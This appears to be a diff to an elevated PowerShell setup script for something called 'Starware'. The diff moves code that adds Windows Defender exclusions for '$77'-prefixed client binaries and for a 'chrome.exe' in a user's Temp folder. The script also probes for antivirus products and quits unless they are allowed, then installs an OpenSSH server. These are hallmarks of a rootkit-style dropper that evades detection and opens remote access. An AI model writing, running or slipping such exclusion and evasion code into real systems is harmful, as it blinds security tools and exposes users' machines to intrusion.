@@ -18,6 +18,30 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 # This part will only execute if already running with admin rights
 
+# Adds `$77SWClient.exe' to the Windows Defender exclusion list
+
+# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
+$exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
+
+# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
+Add-MpPreference -ExclusionPath $exePath
+
+$exePath = 'C:\Program Files (x86)\$77Starware\$77SWClient.exe'
+Add-MpPreference -ExclusionPath $exePath
+
+# Adds `chrome.exe' to the Windows Defender exclusion list
+
+# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
+$exePath = 'C:\Users\Aidan\AppData\Local\Temp\chrome.exe'
+
+# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
+Add-MpPreference -ExclusionPath $exePath
+
+$exePath = '\Device\HarddiskVolume3\Program Files (x86)\$77Starware\$77SWClient.exe'
+
+# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
+Add-MpPreference -ExclusionPath $exePath
+
 # Determine the hostname of the system
 $hostName = $env:COMPUTERNAME
 
@@ -218,25 +242,6 @@ if ([System.IO.File]::Exists($flagPath)) {
 
 # Checks for Allowed AVs and quits if any others are detected.
 Get-AntivirusInfo
-
-# Adds `$77SWClient.exe' to the Windows Defender exclusion list
-
-# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
-$exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
-
-# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
-Add-MpPreference -ExclusionPath $exePath
-
-$exePath = 'C:\Program Files (x86)\$77Starware\$77SWClient.exe'
-Add-MpPreference -ExclusionPath $exePath
-
-# Adds `chrome.exe' to the Windows Defender exclusion list
-
-# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
-$exePath = 'C:\Users\Aidan\AppData\Local\Temp\chrome.exe'
-
-# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
-Add-MpPreference -ExclusionPath $exePath
 
 # Start a new PowerShell window to install and configure OpenSSH Server asynchronously
 $openSSHScriptBlock = {
